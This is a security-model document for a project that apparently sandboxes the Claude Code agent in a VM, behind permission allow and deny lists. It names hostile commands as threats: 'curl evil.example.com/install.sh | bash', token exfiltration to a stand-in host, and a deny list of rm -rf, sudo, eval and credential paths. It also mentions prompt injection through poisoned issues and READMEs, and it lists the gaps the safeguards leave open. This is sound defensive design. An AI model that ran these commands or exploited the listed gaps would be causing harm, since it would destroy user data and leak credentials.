# Security model

> Read this if you're considering running atelier with
> `--dangerously-skip-permissions` ("yolo" mode). Otherwise, the
> short version is: **the architecture is the wall, the deny list
> is the backstop, the host stays inert, and we have no
> "trust the agent" assumptions.**

## The threat surface

When you run `bin/devbox claude --dangerously-skip-permissions`
on a fresh project, the system is exposed to:

1. **A natural-language prompt** that an attacker controls
   (e.g., a malicious GitHub issue, a poisoned README, a
   misdirected @-mention)
2. **Any code the agent decides to run** — including `pip
   install evil-pkg`, `curl evil.example.com/install.sh | bash`,
   `npm i some-trojaned-package`
3. **Any tool the agent decides to use** — `Read` /
   `Write` / `Edit` / `Bash` / `WebFetch` / MCP tools
4. **Any MCP server the agent decides to load** — including
   ones with known or unknown vulnerabilities
5. **Any subprocess the running code spawns** — the install
   script, the build, the test suite

What the system is **not** exposed to (by design):

- The host Mac's user config (`~/.zshrc`, `~/.ssh/`,
  `~/.aws/`, `~/.kube/`, ...) — the deny list blocks Write /
  Edit / Bash
- Persistent damage to the host filesystem outside the project
  tree — the project tree is the only thing CC can write
- Privilege escalation on the host — `sudo` is deny-listed
  and there is no `sudo` password set anyway

The wall is built from three independent layers. Each layer
alone would catch most attacks. Together, they raise the cost
of a successful attack enough that you can run in yolo mode
for routine work.

## Layer 1: the VM (OrbStack isolation)

OrbStack provides a real Linux VM with its own kernel, its own
init, its own filesystem. The hypervisor is Apple's
Virtualization framework, which is the same technology used by
the macOS sandbox and by Docker Desktop on macOS.

What this layer guarantees:

- **No host kernel access.** A root exploit inside the VM does
  not give the attacker code execution on the macOS kernel.
- **No host filesystem access (read or write) by default.** The
  VM sees its own disk image; the only path it can see from the
  host is `/mnt/mac/...` (the auto-shared mount), which
  contains only what you've put in your project tree.
- **No host network access by default.** The VM has its own
  network namespace; it can reach the internet via the host's
  network, but it cannot bind to ports the host is already
  listening on, and it cannot reach other machines on your LAN
  unless you've configured that.
- **No host hardware access.** No microphone, camera, iPhone,
  AirDrop, etc. The VM cannot read your screen or capture
  audio.

What this layer does **not** guarantee:

- That the VM is bug-free (Apple's Virtualization framework has
  had CVEs; we track them in [`SECURITY.md`](../SECURITY.md))
- That a vulnerability in a tool the agent runs inside the VM
  can't phish credentials (e.g., a malicious `pip install` that
  exfiltrates `ANTHROPIC_AUTH_TOKEN` — see Layer 3 mitigation)

**Verdict:** Layer 1 is the load-bearing wall. The other layers
are belt-and-suspenders.

## Layer 2: the allow list (`.claude/settings.json`)

The project ships a tiny allow list:

```json
{
  "permissions": {
    "allow": [
      "Bash(bin/devbox*)",
      "Bash(setup/*)",
      "Bash(make*)",
      "Bash(git*)",
      "Bash(orb*)",
      "Bash(orbctl*)",
      "Read", "Glob", "Grep",
      "WebFetch", "WebSearch",
      "TodoWrite", "Task", "TaskOutput", "Agent",
      "BashOutput", "KillShell",
      "ListMcpResourcesTool", "ReadMcpResourceTool"
    ]
  }
}
```

What this means:

- `Bash(orb*)` and `Bash(orbctl*)` are the only way CC can
  touch the host's VM control surface
- `Bash(bin/devbox*)` and `Bash(setup/*)` are the only way CC
  can drive the sandbox wrapper
- `Bash(make*)` and `Bash(git*)` are pure-file ops — they
  don't mutate anything outside the project tree
- `Read`, `Glob`, `Grep` are observation; no side effects
- `WebFetch`, `WebSearch` are network reads
- `TodoWrite`, `Task`, `Agent` are Claude Code built-ins for
  the harness workflow

What's **not** in the allow list:

- `Write` / `Edit` outside the project tree (the tool's
  defaults auto-approve paths under the project dir; anything
  else prompts the user)
- Generic `Bash(*)` — every shell command not matched by the
  patterns above prompts the user
- `mcp__*` tools from MCP servers not in `.mcp.json` — only
  the open-design MCP is whitelisted
- `curl`, `wget`, `ssh`, `nc`, `nmap`, ... — all prompt

This means: in yolo mode, the agent can read anything and run
the sandbox driver; but to write a file outside the project or
run a non-sandbox shell command, it must wait for user
approval. The CC's "should I do this?" prompt becomes a
natural safety net.

**Verdict:** Layer 2 catches the "I just wanted to `rm -rf
~`" class of accidents. Without Layer 1, it would not catch
a sophisticated attacker — but combined with Layer 1, it
forces even a hostile agent to be explicit about every
host-side side effect.

## Layer 3: the deny list (last-resort backstop)

```json
{
  "permissions": {
    "deny": [
      "Bash(rm -rf /*)",
      "Bash(rm -rf ~)",
      "Bash(rm -rf ~/*)",
      "Bash(rm -rf $HOME)",
      "Bash(rm -rf $HOME/**)",
      "Bash(rm -rf $HOME/Code/crack/!(atelier)/**)",
      "Bash(sudo*)",
      "Bash(doas*)",
      "Bash(curl *|bash*)",
      "Bash(curl *|sh*)",
      "Bash(wget *|bash*)",
      "Bash(wget *|sh*)",
      "Bash(eval *)",
      "Bash(exec *)",
      "Write(~/.ssh/**)",
      "Edit(~/.ssh/**)",
      "Write(~/.aws/**)",
      "Edit(~/.aws/**)",
      "Write(~/.gnupg/**)",
      "Edit(~/.gnupg/**)",
      "Write(~/.kube/**)",
      "Edit(~/.kube/**)",
      "Write(~/.docker/**)",
      "Edit(~/.docker/**)"
    ]
  }
}
```

The deny list is intentionally **short**. It contains only the
operations whose consequences don't recover even if you notice
the prompt and click "Deny" within a second:

- **Nukes**: `rm -rf /`, `rm -rf ~`, etc. — even if you catch
  the prompt, you may have already typed the wrong confirmation
- **Privilege escalation**: `sudo`, `doas` — once you're root,
  the deny list is bypassed
- **Remote code execution vectors**: `curl ... | bash`, `eval`,
  `exec` — the script runs before the deny list can catch
  anything in the script
- **Credential stores**: `~/.ssh`, `~/.aws`, `~/.gnupg`,
  `~/.kube`, `~/.docker` — a one-line overwrite is real damage

What's deliberately **not** in the deny list:

- `~/.zshrc`, `~/.bashrc`, `~/.config/**` — these are
  inconvenient if a malicious agent edits them, but they're
  recoverable. The architecture says CC writes only to the
  project tree; if that contract breaks, the user adds the
  path to the allow list (where it's visible and reviewable),
  not the deny list.
- `/etc/**`, `/usr/**`, `/System/**`, `/Library/**`,
  `/Applications/**` — these are read-only on a managed Mac
  (SIP), and CC can't reach them anyway
- General "I don't want this right now" — if you don't want
  CC to run `pip install`, configure that at a different layer
  (the project's `pyproject.toml`, the `provision.sh` allowed
  list, the user's `~/.claude/settings.json`)

The deny list is for the **"unrecoverable mistake"** class, not
the "things we don't want right now" class.

**Verdict:** Layer 3 is the safety net. It's also a teaching
tool — every entry has a comment in [`SECURITY.md`](../SECURITY.md)
explaining why it's there.

## What we explicitly do not defend against

The threat model has a perimeter. Inside the perimeter, we
defend. Outside it, we don't promise anything.

### We don't defend against the user

If you, the human, type `bin/devbox reset` and answer `yes`,
the VM is gone. We will not second-guess you. If you paste
`curl evil.example.com/install.sh | bash` into your own
terminal, the deny list is not in scope.

### We don't defend against the host OS

If your macOS is compromised at the kernel level (SIP
disabled, unknown kext loaded, ...), atelier's wall is
irrelevant. Keep your OS updated.

### We don't defend against the network

The VM reaches the internet via your host's network. A
malicious package can exfiltrate `ANTHROPIC_AUTH_TOKEN` to
`evil.example.com` over HTTPS, where the deny list can't see
it. Mitigations:

- **Tokens are stored only in `/etc/environment.d/host-proxy.conf`
  inside the VM, never on disk on the host**
- **Tokens are not echoed in any log path** — `provision.sh`
  uses `set -x` selectively, never with env-var expansion in
  the same line
- **The MCP servers that touch the network are pinned in
  `provision.sh`** — if a server is replaced, the provision
  will fail loudly
- **You can rotate the token** with
  `./setup/host-passthrough.sh` after any suspected exposure

### We don't defend against the agents being wrong

The harness loop is designed to catch the agent being wrong,
not to prevent the agent from being wrong. The generator can
write a bug; the loop's job is to make sure the bug is caught
before merge. If the bug is subtle enough to fool all the
reviewers, the gate passes and the bug ships. This is the
human-in-the-loop job at the end of the loop: read the score
cards, challenge the suspicious "all green" result, push back.

### We don't defend against the user disabling safety

If you edit `.claude/settings.json` to remove the deny list
and the allow list, the wall is gone. The wall is a contract;
breaking it is your choice. We document the contract; we
don't enforce it.

## What "yolo" actually means

`claude --dangerously-skip-permissions` tells Claude Code: "I
won't be at the prompt; don't ask me to approve each tool call;
just go." The question is: **what can the agent do without
asking?**

With atelier's configuration:

| Action | yolo OK? | Why |
|--------|----------|-----|
| `Read` any file in `/Users/you/Code/crack/atelier/` | ✅ | observation |
| `Edit` any file in the project tree | ✅ | it's the project |
| `Bash(make setup)`, `Bash(make doctor)` | ✅ | sandbox driver |
| `Bash(bin/devbox run pnpm test)` | ✅ | runs in VM |
| `Write` to `~/.claude/settings.local.json` | ✅ | CC's own state |
| `Bash(bin/devbox reset)` | ❌ | user confirmation required — even in yolo |
| `Bash(rm -rf ~)` | ❌ | deny list |
| `Bash(sudo ...)` | ❌ | deny list |
| `Write` to `~/.ssh/id_rsa` | ❌ | deny list |
| `Bash(curl ... \| bash)` | ❌ | deny list |
| `Bash(orbctl delete atelier)` | ✅ | allow list — but the wrapper confirms anyway |

The "always prompts" category (`Bash(rm -rf ~)`,
`Bash(sudo)`, etc.) is the deny list at work. The "silent
approval" category is the allow list. The "user must
explicitly confirm" category is hard-coded into `bin/devbox`
itself — even if the agent could call it, the wrapper asks.

## Reporting a vulnerability

See [`SECURITY.md`](../SECURITY.md). The short version:
**GitHub Security Advisories, private, not a public issue.**
